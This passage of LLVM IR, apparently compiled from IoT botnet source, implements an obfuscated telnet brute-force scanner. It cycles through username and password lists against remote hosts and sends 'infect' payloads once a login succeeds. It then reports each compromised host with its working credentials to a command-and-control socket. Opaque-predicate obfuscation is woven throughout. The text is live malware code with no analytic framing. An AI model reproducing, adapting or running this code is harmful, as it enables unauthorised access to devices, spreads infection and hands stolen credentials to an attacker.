  %650 = call i64 @send(i32 %649, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0), i64 2, i32 16384)
  %651 = icmp slt i64 %650, 0
  br i1 %651, label %652, label %656

; <label>:652:                                    ; preds = %644
  %653 = load i32, i32* %9, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %654
  call void @reset_telstate(%struct.telstate_t* %655)
  br label %1188

; <label>:656:                                    ; preds = %644
  %657 = load i32, i32* %9, align 4
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %658
  call void @advance_state(%struct.telstate_t* %659, i32 4)
  br label %1171

; <label>:660:                                    ; preds = %186
  %661 = load i32, i32* %9, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %662
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %663, i32 0, i32 0
  %665 = load i32, i32* %664, align 16
  %666 = load i32, i32* %15, align 4
  %667 = load i32, i32* %9, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 9
  %671 = load i8*, i8** %670, align 8
  %672 = call i32 @read_until_response(i32 %665, i32 %666, i8* %671, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %673 = icmp ne i32 %672, 0
  br i1 %673, label %674, label %691

; <label>:674:                                    ; preds = %660
  %675 = load i32, i32* %9, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 9
  %679 = load i8*, i8** %678, align 8
  %680 = call i32 @contains_fail(i8* %679)
  %681 = icmp ne i32 %680, 0
  br i1 %681, label %682, label %686

; <label>:682:                                    ; preds = %674
  %683 = load i32, i32* %9, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %684
  call void @advance_state(%struct.telstate_t* %685, i32 0)
  br label %690

; <label>:686:                                    ; preds = %674
  %687 = load i32, i32* %9, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %688
  call void @advance_state(%struct.telstate_t* %689, i32 5)
  br label %690

; <label>:690:                                    ; preds = %686, %682
  br label %1188

; <label>:691:                                    ; preds = %660
  %692 = load i32, i32* @x.91
  %693 = load i32, i32* @y.92
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %691
  %700 = load i32, i32* %9, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %701
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %702, i32 0, i32 7
  %704 = load i32, i32* %703, align 16
  %705 = add i32 %704, 6
  %706 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %707 = icmp ult i32 %705, %706
  %708 = load i32, i32* @x.91
  %709 = load i32, i32* @y.92
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBBpart298, label %originalBB92alteredBB

originalBBpart298:                                ; preds = %originalBB92
  br i1 %707, label %716, label %720

; <label>:716:                                    ; preds = %originalBBpart298
  %717 = load i32, i32* %9, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %718
  call void @reset_telstate(%struct.telstate_t* %719)
  br label %720

; <label>:720:                                    ; preds = %716, %originalBBpart298
  %721 = load i32, i32* @x.91
  %722 = load i32, i32* @y.92
  %723 = sub i32 %721, 1
  %724 = mul i32 %721, %723
  %725 = urem i32 %724, 2
  %726 = icmp eq i32 %725, 0
  %727 = icmp slt i32 %722, 10
  %728 = or i1 %726, %727
  br i1 %728, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %720
  %729 = load i32, i32* @x.91
  %730 = load i32, i32* @y.92
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %1171

; <label>:737:                                    ; preds = %186
  %738 = load i32, i32* %9, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 0
  %742 = load i32, i32* %741, align 16
  %743 = load i32, i32* %9, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %744
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %745, i32 0, i32 5
  %747 = load i8, i8* %746, align 1
  %748 = zext i8 %747 to i64
  %749 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %748
  %750 = load i8*, i8** %749, align 8
  %751 = load i32, i32* %9, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 5
  %755 = load i8, i8* %754, align 1
  %756 = zext i8 %755 to i64
  %757 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %756
  %758 = load i8*, i8** %757, align 8
  %759 = call i64 @strlen(i8* %758) #10
  %760 = call i64 @send(i32 %742, i8* %750, i64 %759, i32 16384)
  %761 = icmp slt i64 %760, 0
  br i1 %761, label %762, label %766

; <label>:762:                                    ; preds = %737
  %763 = load i32, i32* %9, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %764
  call void @reset_telstate(%struct.telstate_t* %765)
  br label %1188

; <label>:766:                                    ; preds = %737
  %767 = load i32, i32* %9, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 0
  %771 = load i32, i32* %770, align 16
  %772 = call i64 @send(i32 %771, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0), i64 2, i32 16384)
  %773 = icmp slt i64 %772, 0
  br i1 %773, label %774, label %778

; <label>:774:                                    ; preds = %766
  %775 = load i32, i32* %9, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %776
  call void @reset_telstate(%struct.telstate_t* %777)
  br label %1188

; <label>:778:                                    ; preds = %766
  %779 = load i32, i32* %9, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %780
  call void @advance_state(%struct.telstate_t* %781, i32 6)
  br label %1171

; <label>:782:                                    ; preds = %186
  %783 = load i32, i32* @x.91
  %784 = load i32, i32* @y.92
  %785 = sub i32 %783, 1
  %786 = mul i32 %783, %785
  %787 = urem i32 %786, 2
  %788 = icmp eq i32 %787, 0
  %789 = icmp slt i32 %784, 10
  %790 = or i1 %788, %789
  br i1 %790, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %782
  %791 = load i32, i32* %9, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 0
  %795 = load i32, i32* %794, align 16
  %796 = load i32, i32* %15, align 4
  %797 = load i32, i32* %9, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 9
  %801 = load i8*, i8** %800, align 8
  %802 = call i32 @read_until_response(i32 %795, i32 %796, i8* %801, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %803 = icmp ne i32 %802, 0
  %804 = load i32, i32* @x.91
  %805 = load i32, i32* @y.92
  %806 = sub i32 %804, 1
  %807 = mul i32 %804, %806
  %808 = urem i32 %807, 2
  %809 = icmp eq i32 %808, 0
  %810 = icmp slt i32 %805, 10
  %811 = or i1 %809, %810
  br i1 %811, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br i1 %803, label %812, label %914

; <label>:812:                                    ; preds = %originalBBpart2106
  %813 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %814 = load i32, i32* %9, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 7
  store i32 %813, i32* %817, align 16
  %818 = load i32, i32* %9, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 9
  %822 = load i8*, i8** %821, align 8
  %823 = call i32 @contains_fail(i8* %822)
  %824 = icmp ne i32 %823, 0
  br i1 %824, label %825, label %829

; <label>:825:                                    ; preds = %812
  %826 = load i32, i32* %9, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %827
  call void @advance_state(%struct.telstate_t* %828, i32 0)
  br label %913

; <label>:829:                                    ; preds = %812
  %830 = load i32, i32* @x.91
  %831 = load i32, i32* @y.92
  %832 = sub i32 %830, 1
  %833 = mul i32 %830, %832
  %834 = urem i32 %833, 2
  %835 = icmp eq i32 %834, 0
  %836 = icmp slt i32 %831, 10
  %837 = or i1 %835, %836
  br i1 %837, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %829
  %838 = load i32, i32* %9, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 9
  %842 = load i8*, i8** %841, align 8
  %843 = call i32 @contains_success(i8* %842)
  %844 = icmp ne i32 %843, 0
  %845 = load i32, i32* @x.91
  %846 = load i32, i32* @y.92
  %847 = sub i32 %845, 1
  %848 = mul i32 %845, %847
  %849 = urem i32 %848, 2
  %850 = icmp eq i32 %849, 0
  %851 = icmp slt i32 %846, 10
  %852 = or i1 %850, %851
  br i1 %852, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %844, label %853, label %892

; <label>:853:                                    ; preds = %originalBBpart2110
  %854 = load i32, i32* %9, align 4
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %855
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %856, i32 0, i32 3
  %858 = load i8, i8* %857, align 1
  %859 = zext i8 %858 to i32
  %860 = icmp eq i32 %859, 2
  br i1 %860, label %861, label %865

; <label>:861:                                    ; preds = %853
  %862 = load i32, i32* %9, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %863
  call void @advance_state(%struct.telstate_t* %864, i32 7)
  br label %891

; <label>:865:                                    ; preds = %853
  %866 = load i32, i32* @mainCommSock, align 4
  %867 = load i32, i32* %9, align 4
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %868
  %870 = call i8* @get_telstate_host(%struct.telstate_t* %869)
  %871 = load i32, i32* %9, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 4
  %875 = load i8, i8* %874, align 2
  %876 = zext i8 %875 to i64
  %877 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %876
  %878 = load i8*, i8** %877, align 8
  %879 = load i32, i32* %9, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %880
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %881, i32 0, i32 5
  %883 = load i8, i8* %882, align 1
  %884 = zext i8 %883 to i64
  %885 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %884
  %886 = load i8*, i8** %885, align 8
  %887 = call i32 (i32, i8*, ...) @sockprintf(i32 %866, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.308, i32 0, i32 0), i8* %870, i8* %878, i8* %886)
  %888 = load i32, i32* %9, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %889
  call void @advance_state(%struct.telstate_t* %890, i32 7)
  br label %891

; <label>:891:                                    ; preds = %865, %861
  br label %896

; <label>:892:                                    ; preds = %originalBBpart2110
  %893 = load i32, i32* %9, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %894
  call void @reset_telstate(%struct.telstate_t* %895)
  br label %896

; <label>:896:                                    ; preds = %892, %891
  %897 = load i32, i32* @x.91
  %898 = load i32, i32* @y.92
  %899 = sub i32 %897, 1
  %900 = mul i32 %897, %899
  %901 = urem i32 %900, 2
  %902 = icmp eq i32 %901, 0
  %903 = icmp slt i32 %898, 10
  %904 = or i1 %902, %903
  br i1 %904, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %896
  %905 = load i32, i32* @x.91
  %906 = load i32, i32* @y.92
  %907 = sub i32 %905, 1
  %908 = mul i32 %905, %907
  %909 = urem i32 %908, 2
  %910 = icmp eq i32 %909, 0
  %911 = icmp slt i32 %906, 10
  %912 = or i1 %910, %911
  br i1 %912, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %913

; <label>:913:                                    ; preds = %originalBBpart2114, %825
  br label %1188

; <label>:914:                                    ; preds = %originalBBpart2106
  %915 = load i32, i32* @x.91
  %916 = load i32, i32* @y.92
  %917 = sub i32 %915, 1
  %918 = mul i32 %915, %917
  %919 = urem i32 %918, 2
  %920 = icmp eq i32 %919, 0
  %921 = icmp slt i32 %916, 10
  %922 = or i1 %920, %921
  br i1 %922, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %914
  %923 = load i32, i32* %9, align 4
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %924
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %925, i32 0, i32 7
  %927 = load i32, i32* %926, align 16
  %928 = add i32 %927, 7
  %929 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %930 = icmp ult i32 %928, %929
  %931 = load i32, i32* @x.91
  %932 = load i32, i32* @y.92
  %933 = sub i32 %931, 1
  %934 = mul i32 %931, %933
  %935 = urem i32 %934, 2
  %936 = icmp eq i32 %935, 0
  %937 = icmp slt i32 %932, 10
  %938 = or i1 %936, %937
  br i1 %938, label %originalBBpart2130, label %originalBB116alteredBB

originalBBpart2130:                               ; preds = %originalBB116
  br i1 %930, label %939, label %943

; <label>:939:                                    ; preds = %originalBBpart2130
  %940 = load i32, i32* %9, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %941
  call void @reset_telstate(%struct.telstate_t* %942)
  br label %943

; <label>:943:                                    ; preds = %939, %originalBBpart2130
  %944 = load i32, i32* @x.91
  %945 = load i32, i32* @y.92
  %946 = sub i32 %944, 1
  %947 = mul i32 %944, %946
  %948 = urem i32 %947, 2
  %949 = icmp eq i32 %948, 0
  %950 = icmp slt i32 %945, 10
  %951 = or i1 %949, %950
  br i1 %951, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %943
  %952 = load i32, i32* @x.91
  %953 = load i32, i32* @y.92
  %954 = sub i32 %952, 1
  %955 = mul i32 %952, %954
  %956 = urem i32 %955, 2
  %957 = icmp eq i32 %956, 0
  %958 = icmp slt i32 %953, 10
  %959 = or i1 %957, %958
  br i1 %959, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %1171

; <label>:960:                                    ; preds = %186
  %961 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %962 = load i32, i32* %9, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 7
  store i32 %961, i32* %965, align 16
  %966 = load i32, i32* %9, align 4
  %967 = sext i32 %966 to i64
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %967
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %968, i32 0, i32 0
  %970 = load i32, i32* %969, align 16
  %971 = call i64 @send(i32 %970, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0), i64 4, i32 16384)
  %972 = icmp slt i64 %971, 0
  br i1 %972, label %973, label %974

; <label>:973:                                    ; preds = %960
  br label %974

; <label>:974:                                    ; preds = %973, %960
  %975 = load i32, i32* %9, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 0
  %979 = load i32, i32* %978, align 16
  %980 = call i64 @send(i32 %979, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.310, i32 0, i32 0), i64 7, i32 16384)
  %981 = icmp slt i64 %980, 0
  br i1 %981, label %982, label %983

; <label>:982:                                    ; preds = %974
  br label %983

; <label>:983:                                    ; preds = %982, %974
  %984 = load i32, i32* @x.91
  %985 = load i32, i32* @y.92
  %986 = sub i32 %984, 1
  %987 = mul i32 %984, %986
  %988 = urem i32 %987, 2
  %989 = icmp eq i32 %988, 0
  %990 = icmp slt i32 %985, 10
  %991 = or i1 %989, %990
  br i1 %991, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %983
  %992 = load i32, i32* %9, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 0
  %996 = load i32, i32* %995, align 16
  %997 = load i8*, i8** @infect, align 8
  %998 = load i8*, i8** @infect, align 8
  %999 = call i64 @strlen(i8* %998) #10
  %1000 = call i64 @send(i32 %996, i8* %997, i64 %999, i32 16384)
  %1001 = icmp slt i64 %1000, 0
  %1002 = load i32, i32* @x.91
  %1003 = load i32, i32* @y.92
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %1001, label %1010, label %1042

; <label>:1010:                                   ; preds = %originalBBpart2138
  %1011 = load i32, i32* %9, align 4
  %1012 = sext i32 %1011 to i64
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1012
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1013, i32 0, i32 0
  %1015 = load i32, i32* %1014, align 16
  %1016 = load i8*, i8** @infect2, align 8
  %1017 = load i8*, i8** @infect2, align 8
  %1018 = call i64 @strlen(i8* %1017) #10
  %1019 = call i64 @send(i32 %1015, i8* %1016, i64 %1018, i32 16384)
  %1020 = icmp slt i64 %1019, 0
  br i1 %1020, label %1021, label %1025

; <label>:1021:                                   ; preds = %1010
  %1022 = load i32, i32* %9, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1023
  call void @reset_telstate(%struct.telstate_t* %1024)
  br label %1188

; <label>:1025:                                   ; preds = %1010
  %1026 = load i32, i32* @x.91
  %1027 = load i32, i32* @y.92
  %1028 = sub i32 %1026, 1
  %1029 = mul i32 %1026, %1028
  %1030 = urem i32 %1029, 2
  %1031 = icmp eq i32 %1030, 0
  %1032 = icmp slt i32 %1027, 10
  %1033 = or i1 %1031, %1032
  br i1 %1033, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1025
  %1034 = load i32, i32* @x.91
  %1035 = load i32, i32* @y.92
  %1036 = sub i32 %1034, 1
  %1037 = mul i32 %1034, %1036
  %1038 = urem i32 %1037, 2
  %1039 = icmp eq i32 %1038, 0
  %1040 = icmp slt i32 %1035, 10
  %1041 = or i1 %1039, %1040
  br i1 %1041, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %1042

; <label>:1042:                                   ; preds = %originalBBpart2142, %originalBBpart2138
  %1043 = load i32, i32* @x.91
  %1044 = load i32, i32* @y.92
  %1045 = sub i32 %1043, 1
  %1046 = mul i32 %1043, %1045
  %1047 = urem i32 %1046, 2
  %1048 = icmp eq i32 %1047, 0
  %1049 = icmp slt i32 %1044, 10
  %1050 = or i1 %1048, %1049
  br i1 %1050, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1042
  %1051 = load i32, i32* %9, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 0
  %1055 = load i32, i32* %1054, align 16
  %1056 = load i32, i32* %15, align 4
  %1057 = load i32, i32* %9, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1058
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1059, i32 0, i32 9
  %1061 = load i8*, i8** %1060, align 8
  %1062 = call i32 @read_until_response(i32 %1055, i32 %1056, i8* %1061, i32 512, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i32 0, i32 0))
  %1063 = icmp ne i32 %1062, 0
  %1064 = load i32, i32* @x.91
  %1065 = load i32, i32* @y.92
  %1066 = sub i32 %1064, 1
  %1067 = mul i32 %1064, %1066
  %1068 = urem i32 %1067, 2
  %1069 = icmp eq i32 %1068, 0
  %1070 = icmp slt i32 %1065, 10
  %1071 = or i1 %1069, %1070
  br i1 %1071, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br i1 %1063, label %1072, label %1132

; <label>:1072:                                   ; preds = %originalBBpart2146
  %1073 = load i32, i32* %9, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1074
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1075, i32 0, i32 9
  %1077 = load i8*, i8** %1076, align 8
  %1078 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8**, ...)*)(i8* %1077, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infectedmessage, i32 0, i32 0))
  %1079 = icmp ne i32 %1078, 0
  br i1 %1079, label %1080, label %1115

; <label>:1080:                                   ; preds = %1072
  %1081 = load i32, i32* %9, align 4
  %1082 = sext i32 %1081 to i64
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1082
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1083, i32 0, i32 3
  %1085 = load i8, i8* %1084, align 1
  %1086 = zext i8 %1085 to i32
  %1087 = icmp ne i32 %1086, 3
  br i1 %1087, label %1088, label %1115

; <label>:1088:                                   ; preds = %1080
  %1089 = load i32, i32* @mainCommSock, align 4
  %1090 = load i32, i32* %9, align 4
  %1091 = sext i32 %1090 to i64
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1091
  %1093 = call i8* @get_telstate_host(%struct.telstate_t* %1092)
  %1094 = load i32, i32* %9, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1095
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1096, i32 0, i32 4
  %1098 = load i8, i8* %1097, align 2
  %1099 = zext i8 %1098 to i64
  %1100 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %1099
  %1101 = load i8*, i8** %1100, align 8
  %1102 = load i32, i32* %9, align 4
  %1103 = sext i32 %1102 to i64
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 5
  %1106 = load i8, i8* %1105, align 1
  %1107 = zext i8 %1106 to i64
  %1108 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %1107
  %1109 = load i8*, i8** %1108, align 8
  %1110 = call i32 (i32, i8*, ...) @sockprintf(i32 %1089, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.311, i32 0, i32 0), i8* %1093, i8* %1101, i8* %1109)
  %1111 = load i32, i32* %9, align 4
  %1112 = sext i32 %1111 to i64
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1112
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1113, i32 0, i32 3
  store i8 3, i8* %1114, align 1
  br label %1115

; <label>:1115:                                   ; preds = %1088, %1080, %1072
  %1116 = load i32, i32* @x.91
  %1117 = load i32, i32* @y.92
  %1118 = sub i32 %1116, 1
  %1119 = mul i32 %1116, %1118
  %1120 = urem i32 %1119, 2
  %1121 = icmp eq i32 %1120, 0
  %1122 = icmp slt i32 %1117, 10
  %1123 = or i1 %1121, %1122
  br i1 %1123, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %1115
  %1124 = load i32, i32* @x.91
  %1125 = load i32, i32* @y.92
  %1126 = sub i32 %1124, 1
  %1127 = mul i32 %1124, %1126
  %1128 = urem i32 %1127, 2
  %1129 = icmp eq i32 %1128, 0
  %1130 = icmp slt i32 %1125, 10
  %1131 = or i1 %1129, %1130
  br i1 %1131, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br label %1132

; <label>:1132:                                   ; preds = %originalBBpart2150, %originalBBpart2146
  %1133 = load i32, i32* %9, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1134
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1135, i32 0, i32 7
  %1137 = load i32, i32* %1136, align 16
  %1138 = add i32 %1137, 8
  %1139 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1140 = icmp ult i32 %1138, %1139
  br i1 %1140, label %1141, label %1170

; <label>:1141:                                   ; preds = %1132
  %1142 = load i32, i32* @x.91
  %1143 = load i32, i32* @y.92
  %1144 = sub i32 %1142, 1
  %1145 = mul i32 %1142, %1144
  %1146 = urem i32 %1145, 2
  %1147 = icmp eq i32 %1146, 0
  %1148 = icmp slt i32 %1143, 10
  %1149 = or i1 %1147, %1148
  br i1 %1149, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %1141
  %1150 = load i32, i32* %9, align 4
  %1151 = sext i32 %1150 to i64
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1151
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1152, i32 0, i32 3
  %1154 = load i8, i8* %1153, align 1
  %1155 = zext i8 %1154 to i32
  %1156 = icmp ne i32 %1155, 3
  %1157 = load i32, i32* @x.91
  %1158 = load i32, i32* @y.92
  %1159 = sub i32 %1157, 1
  %1160 = mul i32 %1157, %1159
  %1161 = urem i32 %1160, 2
  %1162 = icmp eq i32 %1161, 0
  %1163 = icmp slt i32 %1158, 10
